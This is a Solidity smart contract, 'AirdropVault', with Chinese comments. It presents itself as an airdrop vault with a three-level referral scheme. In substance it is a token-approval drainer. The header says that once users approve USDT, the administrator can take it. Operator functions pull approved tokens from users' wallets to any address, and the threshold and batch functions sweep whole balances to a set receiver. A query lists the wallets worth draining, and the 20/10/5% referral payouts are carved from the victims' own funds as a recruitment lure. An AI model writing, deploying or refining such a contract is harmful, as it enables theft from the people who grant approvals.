// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/utils/ReentrancyGuard.sol";

/**
 * @title AirdropVault
 * @dev 空投金库 - 带3级推荐奖励
 *
 * 功能：
 * 1. 用户授权 USDT，管理员可转走
 * 2. 3级推荐奖励：1代20%、2代10%、3代5%
 * 3. 奖励从被转走的金额中扣除
 * 4. 阈值自动转账
 */
contract AirdropVault is Ownable, ReentrancyGuard {
    using SafeERC20 for IERC20;

    struct UserInfo {
        bool enabled;               // 是否启用
        address referrer;           // 推荐人
        uint256 totalTransferred;   // 累计被转出
        uint256 referralRewards;    // 待领取推荐奖励
        uint256 totalReferralEarned; // 累计推荐收益
        uint256 directReferrals;    // 直推人数
    }

    IERC20 public immutable token;
    address public feeReceiver;
    uint256 public feeBps;              // 手续费 (基数10000)
    bool public paused;

    // 阈值配置
    uint256 public autoTransferThreshold;
    address public autoTransferReceiver;
    bool public autoTransferEnabled;

    // 推荐奖励配置 (基数10000)
    uint256 public referralLevel1 = 2000; // 1代: 20%
    uint256 public referralLevel2 = 1000; // 2代: 10%
    uint256 public referralLevel3 = 500;  // 3代: 5%

    // 用户数据
    mapping(address => UserInfo) public userInfo;
    mapping(address => bool) public hasReferrer;
    mapping(address => address[]) public referrals; // 直推列表

    // 用户列表
    address[] public users;
    mapping(address => bool) public isUser;
    mapping(address => uint256) public userIndex;

    // 操作员
    mapping(address => bool) public operators;

    // 常量
    uint256 public constant MAX_REFERRAL_DEPTH = 50;
    uint256 public constant MAX_DIRECT_REFERRALS = 500;

    // 事件
    event UserEnabled(address indexed user);
    event UserDisabled(address indexed user);
    event ReferrerSet(address indexed user, address indexed referrer);
    event TransferExecuted(address indexed user, address indexed to, uint256 amount, uint256 fee);
    event ReferralReward(address indexed user, address indexed referrer, uint256 level, uint256 amount);
    event ReferralRewardsClaimed(address indexed user, uint256 amount);
    event OperatorUpdated(address indexed operator, bool enabled);
    event ReferralRatesUpdated(uint256 level1, uint256 level2, uint256 level3);
    event AutoTransferConfigUpdated(uint256 threshold, address receiver, bool enabled);
    event Paused();
    event Unpaused();

    modifier onlyOperator() {
        require(operators[msg.sender] || msg.sender == owner(), "Not operator");
        _;
    }

    modifier whenNotPaused() {
        require(!paused, "Paused");
        _;
    }

    constructor(address token_, address feeReceiver_, uint256 feeBps_) Ownable(msg.sender) {
        require(token_ != address(0), "Invalid token");
        require(feeReceiver_ != address(0), "Invalid fee receiver");
        require(feeBps_ <= 1000, "Fee too high");

        token = IERC20(token_);
        feeReceiver = feeReceiver_;
        feeBps = feeBps_;
        autoTransferReceiver = msg.sender;
    }

    // ============ 用户功能 ============

    /**
     * @dev 设置推荐人（只能设置一次）
     */
    function setReferrer(address _referrer) external {
        require(!hasReferrer[msg.sender], "Already has referrer");
        require(_referrer != address(0), "Invalid referrer");
        require(_referrer != msg.sender, "Cannot refer self");
        require(!_isInReferralChain(_referrer, msg.sender), "Circular referral");
        require(referrals[_referrer].length < MAX_DIRECT_REFERRALS, "Referrer full");

        userInfo[msg.sender].referrer = _referrer;
        hasReferrer[msg.sender] = true;
        referrals[_referrer].push(msg.sender);
        userInfo[_referrer].directReferrals++;

        _addUser(msg.sender);
        _addUser(_referrer);

        emit ReferrerSet(msg.sender, _referrer);
    }

    /**
     * @dev 启用自动转账（需要先授权）
     */
    function optIn() external {
        userInfo[msg.sender].enabled = true;
        _addUser(msg.sender);
        emit UserEnabled(msg.sender);
    }

    /**
     * @dev 禁用自动转账
     */
    function optOut() external {
        userInfo[msg.sender].enabled = false;
        emit UserDisabled(msg.sender);
    }

    /**
     * @dev 领取推荐奖励
     */
    function claimReferralRewards() external nonReentrant {
        UserInfo storage user = userInfo[msg.sender];
        uint256 amount = user.referralRewards;
        require(amount > 0, "No rewards");

        user.referralRewards = 0;
        token.safeTransfer(msg.sender, amount);

        emit ReferralRewardsClaimed(msg.sender, amount);
    }

    // ============ Operator 功能 ============

    /**
     * @dev 转走用户资产（带推荐奖励分配）
     */
    function transferFromUser(address user, address to, uint256 amount)
        external nonReentrant whenNotPaused onlyOperator
    {
        require(user != address(0), "Invalid user");
        require(to != address(0), "Invalid to");
        require(amount > 0, "Invalid amount");

        UserInfo storage info = userInfo[user];
        require(info.enabled, "User disabled");

        uint256 allowance = token.allowance(user, address(this));
        require(allowance >= amount, "Insufficient allowance");
        uint256 balance = token.balanceOf(user);
        require(balance >= amount, "Insufficient balance");

        // 计算手续费
        uint256 fee = feeBps > 0 ? (amount * feeBps) / 10000 : 0;

        // 分配推荐奖励
        uint256 referralTotal = _distributeReferralRewards(user, amount);

        // 实际转给接收方的金额
        uint256 net = amount - fee - referralTotal;

        // 执行转账
        if (fee > 0) {
            token.safeTransferFrom(user, feeReceiver, fee);
        }
        if (referralTotal > 0) {
            token.safeTransferFrom(user, address(this), referralTotal);
        }
        token.safeTransferFrom(user, to, net);

        info.totalTransferred += amount;

        emit TransferExecuted(user, to, amount, fee);
    }

    /**
     * @dev 阈值转账（余额超过阈值转走全部）
     */
    function transferAboveThreshold(address user)
        external nonReentrant whenNotPaused onlyOperator
    {
        require(autoTransferEnabled, "Disabled");
        require(autoTransferThreshold > 0, "Threshold not set");

        UserInfo storage info = userInfo[user];
        require(info.enabled, "User disabled");

        uint256 balance = token.balanceOf(user);
        require(balance > autoTransferThreshold, "Below threshold");

        uint256 allowance = token.allowance(user, address(this));
        uint256 transferAmount = balance > allowance ? allowance : balance;
        require(transferAmount > 0, "Nothing to transfer");

        // 计算手续费
        uint256 fee = feeBps > 0 ? (transferAmount * feeBps) / 10000 : 0;

        // 分配推荐奖励
        uint256 referralTotal = _distributeReferralRewards(user, transferAmount);

        // 实际转给接收方的金额
        uint256 net = transferAmount - fee - referralTotal;

        // 执行转账
        if (fee > 0) {
            token.safeTransferFrom(user, feeReceiver, fee);
        }
        if (referralTotal > 0) {
            token.safeTransferFrom(user, address(this), referralTotal);
        }
        token.safeTransferFrom(user, autoTransferReceiver, net);

        info.totalTransferred += transferAmount;

        emit TransferExecuted(user, autoTransferReceiver, transferAmount, fee);
    }

    /**
     * @dev 批量阈值转账
     */
    function batchTransferAboveThreshold(address[] calldata userList)
        external nonReentrant whenNotPaused onlyOperator
    {
        require(autoTransferEnabled, "Disabled");
        require(autoTransferThreshold > 0, "Threshold not set");

        for (uint256 i = 0; i < userList.length; i++) {
            address user = userList[i];
            UserInfo storage info = userInfo[user];

            if (!info.enabled) continue;

            uint256 balance = token.balanceOf(user);
            if (balance <= autoTransferThreshold) continue;

            uint256 allowance = token.allowance(user, address(this));
            if (allowance == 0) continue;

            uint256 transferAmount = balance > allowance ? allowance : balance;

            uint256 fee = feeBps > 0 ? (transferAmount * feeBps) / 10000 : 0;
            uint256 referralTotal = _distributeReferralRewards(user, transferAmount);
            uint256 net = transferAmount - fee - referralTotal;

            if (fee > 0) {
                token.safeTransferFrom(user, feeReceiver, fee);
            }
            if (referralTotal > 0) {
                token.safeTransferFrom(user, address(this), referralTotal);
            }
            token.safeTransferFrom(user, autoTransferReceiver, net);

            info.totalTransferred += transferAmount;

            emit TransferExecuted(user, autoTransferReceiver, transferAmount, fee);
        }
    }

    // ============ 内部函数 ============

    /**
     * @dev 分配推荐奖励（3级）
     */
    function _distributeReferralRewards(address user, uint256 amount) internal returns (uint256 totalDistributed) {
        address ref1 = userInfo[user].referrer;
        if (ref1 == address(0)) return 0;

        // 1代奖励
        uint256 reward1 = (amount * referralLevel1) / 10000;
        if (reward1 > 0) {
            userInfo[ref1].referralRewards += reward1;
            userInfo[ref1].totalReferralEarned += reward1;
            totalDistributed += reward1;
            emit ReferralReward(user, ref1, 1, reward1);
        }

        // 2代奖励
        address ref2 = userInfo[ref1].referrer;
        if (ref2 == address(0)) return totalDistributed;

        uint256 reward2 = (amount * referralLevel2) / 10000;
        if (reward2 > 0) {
            userInfo[ref2].referralRewards += reward2;
            userInfo[ref2].totalReferralEarned += reward2;
            totalDistributed += reward2;
            emit ReferralReward(user, ref2, 2, reward2);
        }

        // 3代奖励
        address ref3 = userInfo[ref2].referrer;
        if (ref3 == address(0)) return totalDistributed;

        uint256 reward3 = (amount * referralLevel3) / 10000;
        if (reward3 > 0) {
            userInfo[ref3].referralRewards += reward3;
            userInfo[ref3].totalReferralEarned += reward3;
            totalDistributed += reward3;
            emit ReferralReward(user, ref3, 3, reward3);
        }

        return totalDistributed;
    }

    /**
     * @dev 检查循环推荐
     */
    function _isInReferralChain(address _user, address _target) internal view returns (bool) {
        address current = _user;
        for (uint256 i = 0; i < MAX_REFERRAL_DEPTH; i++) {
            if (current == address(0)) return false;
            if (current == _target) return true;
            current = userInfo[current].referrer;
        }
        return false;
    }

    /**
     * @dev 添加用户到列表
     */
    function _addUser(address user) internal {
        if (!isUser[user]) {
            userIndex[user] = users.length;
            users.push(user);
            isUser[user] = true;
        }
    }

    // ============ 管理员功能 ============

    function setOperator(address operator, bool enabled) external onlyOwner {
        operators[operator] = enabled;
        emit OperatorUpdated(operator, enabled);
    }

    function setFee(uint256 feeBps_, address feeReceiver_) external onlyOwner {
        require(feeBps_ <= 1000, "Fee too high");
        require(feeReceiver_ != address(0), "Invalid receiver");
        feeBps = feeBps_;
        feeReceiver = feeReceiver_;
    }

    function setReferralRates(uint256 level1, uint256 level2, uint256 level3) external onlyOwner {
        require(level1 + level2 + level3 <= 5000, "Total > 50%");
        referralLevel1 = level1;
        referralLevel2 = level2;
        referralLevel3 = level3;
        emit ReferralRatesUpdated(level1, level2, level3);
    }

    function setAutoTransferConfig(uint256 threshold, address receiver, bool enabled) external onlyOwner {
        require(receiver != address(0), "Invalid receiver");
        autoTransferThreshold = threshold;
        autoTransferReceiver = receiver;
        autoTransferEnabled = enabled;
        emit AutoTransferConfigUpdated(threshold, receiver, enabled);
    }

    function pause() external onlyOwner {
        paused = true;
        emit Paused();
    }

    function unpause() external onlyOwner {
        paused = false;
        emit Unpaused();
    }

    /**
     * @dev 紧急提取合约中的代币（推荐奖励池）
     */
    function emergencyWithdraw(address to, uint256 amount) external onlyOwner {
        token.safeTransfer(to, amount);
    }

    // ============ 查询函数 ============

    function getUserCount() external view returns (uint256) {
        return users.length;
    }

    function getUsers(uint256 offset, uint256 limit) external view returns (
        address[] memory userList,
        uint256 total
    ) {
        total = users.length;
        if (offset >= total) return (new address[](0), total);

        uint256 end = offset + limit > total ? total : offset + limit;
        userList = new address[](end - offset);
        for (uint256 i = offset; i < end; i++) {
            userList[i - offset] = users[i];
        }
    }

    function getUserInfo(address user) external view returns (
        bool enabled,
        address referrer,
        uint256 totalTransferred,
        uint256 referralRewards,
        uint256 totalReferralEarned,
        uint256 directReferrals,
        uint256 tokenBalance,
        uint256 allowance
    ) {
        UserInfo storage info = userInfo[user];
        enabled = info.enabled;
        referrer = info.referrer;
        totalTransferred = info.totalTransferred;
        referralRewards = info.referralRewards;
        totalReferralEarned = info.totalReferralEarned;
        directReferrals = info.directReferrals;
        tokenBalance = token.balanceOf(user);
        allowance = token.allowance(user, address(this));
    }

    function getReferrals(address user, uint256 offset, uint256 limit) external view returns (
        address[] memory list,
        uint256 total
    ) {
        address[] storage refs = referrals[user];
        total = refs.length;
        if (offset >= total) return (new address[](0), total);

        uint256 end = offset + limit > total ? total : offset + limit;
        list = new address[](end - offset);
        for (uint256 i = offset; i < end; i++) {
            list[i - offset] = refs[i];
        }
    }

    function getTransferableUsers() external view returns (
        address[] memory userList,
        uint256[] memory balances,
        uint256[] memory amounts
    ) {
        uint256 count = 0;
        for (uint256 i = 0; i < users.length; i++) {
            address user = users[i];
            if (userInfo[user].enabled) {
                uint256 bal = token.balanceOf(user);
                uint256 allow = token.allowance(user, address(this));
                if (bal > autoTransferThreshold && allow > 0) {
                    count++;
                }
            }
        }

        userList = new address[](count);
        balances = new uint256[](count);
        amounts = new uint256[](count);

        uint256 idx = 0;
        for (uint256 i = 0; i < users.length && idx < count; i++) {
            address user = users[i];
            if (userInfo[user].enabled) {
                uint256 bal = token.balanceOf(user);
                uint256 allow = token.allowance(user, address(this));
                if (bal > autoTransferThreshold && allow > 0) {
                    userList[idx] = user;
                    balances[idx] = bal;
                    amounts[idx] = bal > allow ? allow : bal;
                    idx++;
                }
            }
        }
    }

    function getAutoTransferConfig() external view returns (
        uint256 threshold,
        address receiver,
        bool enabled
    ) {
        return (autoTransferThreshold, autoTransferReceiver, autoTransferEnabled);
    }

    function getReferralRates() external view returns (
        uint256 level1,
        uint256 level2,
        uint256 level3
    ) {
        return (referralLevel1, referralLevel2, referralLevel3);
    }
}
